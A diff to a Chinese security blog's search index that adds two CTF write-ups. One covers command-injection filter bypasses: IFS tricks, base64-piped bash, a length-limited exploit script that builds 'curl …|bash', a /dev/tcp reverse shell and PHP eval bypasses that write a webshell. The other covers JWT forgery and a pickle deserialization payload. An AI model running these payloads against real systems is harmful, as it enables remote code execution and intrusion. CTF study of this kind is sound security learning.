@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>命令执行绕过技巧</title>
+      <link href="/posts/58281de6/"/>
+      <url>/posts/58281de6/</url>
+      
+        <content type="html"><![CDATA[<h2 id="tar命令绕过"><a href="#tar命令绕过" class="headerlink" title="tar命令绕过"></a>tar命令绕过</h2><p>最近也是才知道的姿势，很多CTF题目并没有过滤tar命令，可以直接打包然后下载，GXYCTF的一道题就可以这样非预期</p><pre><code>?ip=1;tar$IFS$9-cvf$IFS$9index$IFS$9.</code></pre><p><img src="/posts/58281de6/1582542493140.png" alt></p><h2 id="Windows命令执行"><a href="#Windows命令执行" class="headerlink" title="Windows命令执行"></a>Windows命令执行</h2><pre><code class="php">&lt;?php$a = &quot;../ %1a whoami&quot;;$command = &#39;dir &#39;.urldecode($a);$escaped_command = escapeshellcmd($command);var_dump($escaped_command);file_put_contents(&#39;out.bat&#39;,$escaped_command);system(&#39;out.bat&#39;);?&gt;</code></pre><img src="/posts/58281de6/2020/PersonNote/CTF笔记/命令执行绕过技巧/1581933022683.png" style="zoom:50%;"><h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><pre><code>|||&amp;&amp;;</code></pre><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><pre><code>~ ᐅ cat&lt;&gt;flag     flag{fffffffffff}~ ᐅ cat&lt;flag flag{fffffffffff}</code></pre><p><code>${IFS}</code> </p><p>这算是Linux中的一个变量</p><blockquote><p>Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符（internal field separator）。IFS环境变量定义了bash shell用户字段分隔符的一系列字符。默认情况下，bash shell会将下面的字符当做字段分隔符：空格、制表符、换行符。</p></blockquote><pre><code>~ ᐅ echo ${IFS} &gt; aa.txt~ ᐅ xxd aa.txt 00000000: 2009 0a00 0a                              ....//用python读取一下&gt;&gt;&gt; f = open(&quot;aa.txt&quot;)&gt;&gt;&gt; f.readlines()[&#39; \t\n&#39;, &#39;\x00\n&#39;]</code></pre><p>使用 <code>${IFS}</code> 绕过(但是我没有实验成功)  ==只适用于Ubuntu==</p><pre><code class="bash">ubuntu@VM-207-93-ubuntu:~$ cat flagnice dayubuntu@VM-207-93-ubuntu:~$ cat${IFS}flagnice dayubuntu@VM-207-93-ubuntu:~$ cat${IFS}$9flagnice dayubuntu@VM-207-93-ubuntu:~$ cat$IFS$9flagnice day</code></pre><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><p>有些时候会设置一些关键字过滤(比如设置flag)</p><h3 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h3><pre><code>~ ᐅ a=c;b=at;c=flag;$a$b $cflag{fffffffffff}</code></pre><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><pre><code>~ ᐅ echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bashflag{fffffffffff}</code></pre><h3 id="单引号双引号"><a href="#单引号双引号" class="headerlink" title="单引号双引号"></a>单引号双引号</h3><pre><code class="bash">~ ᐅ c&quot;&quot;at flagflag{fffffffffff}~ ᐅ c&quot;&quot;at fl&quot;&quot;agflag{fffffffffff}~ ᐅ c&quot;&quot;at fl&#39;&#39;agflag{fffffffffff}</code></pre><h3 id="反斜线"><a href="#反斜线" class="headerlink" title="反斜线"></a>反斜线</h3><pre><code>~ ᐅ c\at fl\agflag{fffffffffff}</code></pre><h2 id="绕过长度的限制"><a href="#绕过长度的限制" class="headerlink" title="绕过长度的限制"></a>绕过长度的限制</h2><p>原题</p><pre><code class="php">&lt;?php    $sandbox = &#39;/www/sandbox/&#39; . md5(&quot;orange&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);    @mkdir($sandbox);    @chdir($sandbox);    if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;= 5) {        @exec($_GET[&#39;cmd&#39;]);    } else if (isset($_GET[&#39;reset&#39;])) {        @exec(&#39;/bin/rm -rf &#39; . $sandbox);    }    highlight_file(__FILE__);</code></pre><p>Linux 可以通过 <code>\</code> 换行</p><p><code>sh filename</code> 可以执行一个shell脚本，如果有报错的话会自动跳过</p><p><code>&gt;</code> 会覆盖原有的内容</p><p><code>&gt;&gt;</code> 是追加内容</p><p>思路就是通过构造一个文件然后往里面写入类似<code>curl 192.168.1.104|bash</code> 之类的语句然后执行，其实还可以利用其他python 以及PHP环境去执行代码，访问 <code>192.168.1.104/index.php</code>里面的内容<code>bash -i &gt;&amp; /dev/tcp/192.168.1.104/12345 0&gt;&amp;1</code>从而达到反弹webshell的目的</p><p>php执行生成的_的内容序列并非和我们在linux命令行一样，查资料 ls 排序和应该和环境变量<code>LC_COLLATE</code>有关！而php应该是c<br><a href="https://www.zhihu.com/question/273928679" target="_blank" rel="noopener">https://www.zhihu.com/question/273928679</a></p><p><img src="/posts/58281de6/1582539212357.png" alt></p><p>最后的exp</p><pre><code class="python">import requestsfrom time import sleepfrom urllib import quotepayload = [    # generate `ls -t&gt;g` file    &#39;&gt;ls\\&#39;,     &#39;ls&gt;_&#39;,     &#39;&gt;\ \\&#39;,     &#39;&gt;-t\\&#39;,     &#39;&gt;\&gt;g&#39;,     &#39;ls&gt;&gt;_&#39;,     # generate `curl orange.tw.tw|python`    # generate `curl 10.188.2.20|bash`     &#39;&gt;sh\ &#39;,     &#39;&gt;ba\\&#39;,     &#39;&gt;\|\\&#39;,    &#39;&gt;20\\&#39;,    &#39;&gt;2.\\&#39;,     &#39;&gt;8.\\&#39;,    &#39;&gt;18\\&#39;,     &#39;&gt;0.\\&#39;,     &#39;&gt;1\\&#39;,     &#39;&gt;\ \\&#39;,     &#39;&gt;rl\\&#39;,     &#39;&gt;cu\\&#39;,     # exec    &#39;sh _&#39;,     &#39;sh g&#39;, ]r = requests.get(&#39;http://10.188.2.20:22460/?reset=1&#39;)for i in payload:    assert len(i) &lt;= 5     r = requests.get(&#39;http://10.188.2.20:22460/?cmd=&#39; + quote(i) )    print i    sleep(0.2)</code></pre><p><a href="https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge" target="_blank" rel="noopener">Dockerfile</a></p><h2 id="绕过长度为4的限制"><a href="#绕过长度为4的限制" class="headerlink" title="绕过长度为4的限制"></a>绕过长度为4的限制</h2><p>。。太狠了</p><h2 id="绕过长度限制写shell"><a href="#绕过长度限制写shell" class="headerlink" title="绕过长度限制写shell"></a>绕过长度限制写shell</h2><p><img src="/posts/58281de6/1582540869115.png" alt></p><h2 id="参数注入"><a href="#参数注入" class="headerlink" title="参数注入"></a>参数注入</h2><p>gitlist远程命令执行漏洞</p><pre><code class="php">&lt;?phppublic function searchTree($query, $branch){    if (empty($query)) {        return null;    }    $query = escapeshellarg($query);    try {        $results = $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number {$query} $branch&quot;);    } catch (\RuntimeException $e) {        return false;    }</code></pre><p>复现：</p><p>这里的问题出在单引号并不能使得包裹的内容成为一个非选项</p><p><img src="/posts/58281de6/dd89dc70-2446-48e1-a728-5693d1fa868a.bbb0aaacef7d.png" alt></p><p>创建一个 <code>--name</code> 文件，但是无法直接用 cat进行读取，因为会被认为是一个选项，即使是用单引号包裹也不行</p><p>比如这个命令就不会执行，因为单引号包裹的内容放在 <code>-e</code> 选项的值中</p><pre><code>git grep -i --line-number -e &#39;--open-files-in-pager=id;&#39; master</code></pre><p><img src="/posts/58281de6/1582541083787.png" alt></p><p>必须是 <code>cat -- --name</code>, 从这个例子也能看出，单引号并不是区分一个字符串是“参数值”或“选项”的标准。</p><p>修复：</p><pre><code class="php">&lt;?phppublic function searchTree($query, $branch){    if (empty($query)) {        return null;    }    $query = preg_replace(&#39;/(--?[A-Za-z0-9\-]+)/&#39;, &#39;&#39;, $query);    $query = escapeshellarg($query);    try {        $results = $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number -- {$query} $branch&quot;); //强制加入 -- 使得后面的成为参数的值    } catch (\RuntimeException $e) {        return false;    }</code></pre><p>python中存在的漏洞点</p><pre><code class="python">import subprocessquery = &#39;id&#39;r = subprocess.run([&#39;git&#39;, &#39;grep&#39;, &#39;-i&#39;, &#39;--line-number&#39;, query, &#39;master&#39;], cwd=&#39;/tmp/vulhub&#39;)</code></pre><p><img src="/posts/58281de6/8296bbd4-40cd-481e-9147-6f11e80967d8.6b4cdb17a1b8.png" alt></p><h2 id="eval长度限制绕过-amp-amp-PHP5-6新特性"><a href="#eval长度限制绕过-amp-amp-PHP5-6新特性" class="headerlink" title="eval长度限制绕过 &amp;&amp; PHP5.6新特性"></a>eval长度限制绕过 &amp;&amp; PHP5.6新特性</h2><pre><code class="php">&lt;?php$param = $_REQUEST[&#39;param&#39;];if(strlen($param)&lt;17 &amp;&amp; stripos($param,&#39;eval&#39;) === false &amp;&amp; stripos($param,&#39;assert&#39;) === false) {  eval($param);}?&gt;</code></pre><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><pre><code>param=`$_GET[1]`;&amp;1=bash</code></pre><p>或者</p><pre><code>param=exec($_GET[1]);</code></pre><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>有的同学提到了远程文件，但正常文件包含<code>include $_GET[1];</code>，这个刚好17个字符，超了一位。</p><p>不过，其实<code>include$_GET[1];</code>也是可以运行的，中间的空格可以不要。</p><p>这也是一个思路，但限制就是需要开启远程文件包含，但这个选项默认是关闭的。</p><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><pre><code>param=$_GET[a](N,a,8);&amp;a=file_put_contents</code></pre><p>file_put_contents的第一个参数是文件名，我传入N。PHP会认为N是一个常量，但我之前并没有定义这个常量，于是PHP就会把它转换成字符串’N’；第二个参数是要写入的数据，a也被转换成字符串’a’；第三个参数是flag，当flag=8的时候内容会追加在文件末尾，而不是覆盖。</p><p>除了<code>file_put_contents</code>，<code>error_log</code>函数效果也类似。</p><p>但是file_put_contents第二个参数如果是符号，就会导致PHP出错，比如<code>param=$_GET[a](N,&lt;,8);&amp;a=file_put_contents</code>。但如果要写webshell的话，“&lt;”等符号又是必不可少的。</p><p>写shell的方法</p><pre><code># 每次写入一个字符：PD9waHAgZXZhbCgkX1BPU1RbOV0pOw# 最后包含param=include$_GET[0];&amp;0=php://filter/read=convert.base64-decode/resource=N</code></pre><h4 id="本地日志包含"><a href="#本地日志包含" class="headerlink" title="本地日志包含"></a>本地日志包含</h4><pre><code>param=include$_GET[a];&amp;a=/home/u244201241/.logs/php_error.log</code></pre><h3 id="标准答案，利用变长参数执行"><a href="#标准答案，利用变长参数执行" class="headerlink" title="标准答案，利用变长参数执行"></a>标准答案，利用变长参数执行</h3><pre><code>POST /test.php?1[]=test&amp;1[]=var_dump($_SERVER);&amp;2=assert HTTP/1.1Host: localhost:8081Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 22param=usort(...$_GET);</code></pre><p><img src="/posts/58281de6/1582707944277.png" alt></p><p><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html" target="_blank" rel="noopener">参考</a></p><p>一个坑</p><p>想请教下，为什么用标准答案的方法时，get参数必须用数字才能正常执行，换成比如？a[]=test&amp;a[]=phpinfo();&amp;b=assert时就会失败，不知可否解答下</p><p>只有数字索引数组才能作为变长参数数组。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 命令执行 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>sqli-lab记录</title>
       <link href="/posts/70df97a2/"/>
       <url>/posts/70df97a2/</url>
@@ -86,6 +111,33 @@
         <content type="html"><![CDATA[]]></content>
       
       
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>pickle反序列化</title>
+      <link href="/posts/2d71dd35/"/>
+      <url>/posts/2d71dd35/</url>
+      
+        <content type="html"><![CDATA[<p>就分析几道例题吧</p><h2 id="CISCN-2019-ikun"><a href="#CISCN-2019-ikun" class="headerlink" title="CISCN 2019 ikun"></a>CISCN 2019 ikun</h2><p>这题开始脑洞比较大</p><p><img src="/posts/2d71dd35/1583819034564.png" alt></p><p>然后观察URL</p><pre><code>http://b8869902-7911-4d16-bb0c-fe61550e2cea.node3.buuoj.cn/shop?page=1</code></pre><p>开始以为这里有注入，因为加一个单引号网站就崩了</p><p>但是不然。是需要找到 <code>lv6</code></p><pre><code class="python">import requestsURL = &quot;http://b8869902-7911-4d16-bb0c-fe61550e2cea.node3.buuoj.cn/shop?page=&quot;for i in range(2000):    res = requests.get(URL+str(i))    if b&quot;lv6.png&quot; in res.content:        print(i)        break</code></pre><p>注意 <code>res.content</code> 返回的是byte类型， <code>res.text</code> 会自动转码为字符串</p><p>得到的结果是181</p><p><img src="/posts/2d71dd35/1583819267198.png" alt></p><p>当然按照管理你是买不起的</p><p>抓个包改一下折扣</p><p><img src="/posts/2d71dd35/1583819306763.png" alt></p><p>进入后台 </p><pre><code>http://b8869902-7911-4d16-bb0c-fe61550e2cea.node3.buuoj.cn/b1g_m4mber</code></pre><p><img src="/posts/2d71dd35/1583819326133.png" alt></p><p>注意到是用jwt认证的，爆破一下</p><p><img src="/posts/2d71dd35/1583819359124.png" alt></p><p>然后伪造一下进入admin，查看页面源代码有代码下载地址</p><p>审计代码</p><p>看到 <code>Admin.py</code></p><pre><code class="python">import tornado.webfrom sshop.base import BaseHandlerimport pickleimport urllibclass AdminHandler(BaseHandler):    @tornado.web.authenticated    def get(self, *args, **kwargs):        if self.current_user == &quot;admin&quot;:            return self.render(&#39;form.html&#39;, res=&#39;This is Black Technology!&#39;, member=0)        else:            return self.render(&#39;no_ass.html&#39;)    @tornado.web.authenticated    def post(self, *args, **kwargs):        try:            become = self.get_argument(&#39;become&#39;)            p = pickle.loads(urllib.unquote(become))            return self.render(&#39;form.html&#39;, res=p, member=1)        except:            return self.render(&#39;form.html&#39;, res=&#39;This is Black Technology!&#39;, member=0)</code></pre><p>会反序列化传过来的 become 参数，于是</p><pre><code class="python">import pickleimport urllibclass payload(object):    def __reduce__(self):       return (eval, (&quot;open(&#39;/flag.txt&#39;,&#39;r&#39;).read()&quot;,))a = pickle.dumps(payload())a = urllib.quote(a)print a</code></pre><p>生成</p><pre><code>c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</code></pre><p>提交即可</p><p><img src="/posts/2d71dd35/1583819516737.png" alt></p><h2 id="抗疫分享赛webtmp"><a href="#抗疫分享赛webtmp" class="headerlink" title="抗疫分享赛webtmp"></a>抗疫分享赛webtmp</h2><p>这题涉及到了如何手动构造 pickle 数据</p><p>复习一下指令</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 反序列化 </tag>
+            
+            <tag> pickle </tag>
+            
+        </tags>
       
     </entry>
     
